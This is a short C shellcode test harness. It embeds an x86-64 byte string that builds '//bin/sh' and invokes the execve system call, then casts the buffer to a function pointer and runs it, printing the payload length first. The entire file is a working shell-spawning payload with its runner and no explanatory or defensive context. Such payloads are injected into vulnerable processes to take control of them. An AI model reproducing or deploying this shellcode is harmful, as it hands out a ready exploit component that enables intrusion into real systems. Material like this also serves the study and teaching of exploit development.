#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x89\xd3\x48\x29\xda\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x89\x5c\x24\xf8\x48\x83\xec\x08\x48\x89\xe7\x48\x89\x44\x24\xf8\x48\x83\xec\x08\x48\x83\xc1\x0a\x48\x31\xc9\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

